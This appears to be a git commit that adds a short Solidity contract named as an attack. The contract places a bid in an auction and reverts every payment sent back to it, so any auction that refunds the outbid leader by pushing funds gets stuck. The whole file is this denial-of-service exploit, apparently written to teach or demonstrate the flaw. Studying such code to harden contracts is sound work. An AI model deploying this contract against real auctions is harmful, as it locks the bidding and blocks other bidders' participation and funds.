344a16ed6ac7f402548f906215bb27cd880e3d16
shiyonglu <32493145+shiyonglu@users.noreply.github.com>
2022-10-12 09:12:24 -0400

    Create attack004.sol

---
+++ attack004.sol
@@ -0,0 +1,24 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+interface Iauction{
+        function bid() payable external;
+}
+
+contract attackt004{
+         address public owner;
+         Iauction public immutable auc;
+
+        constructor (address  addr){
+            auc = Iauction(addr);
+            owner = msg.sender;
+         }
+
+        function attack() external payable {
+            auc.bid{value: msg.value}();
+        }
+
+        receive() external payable {
+                      revert();
+        }                     
+}
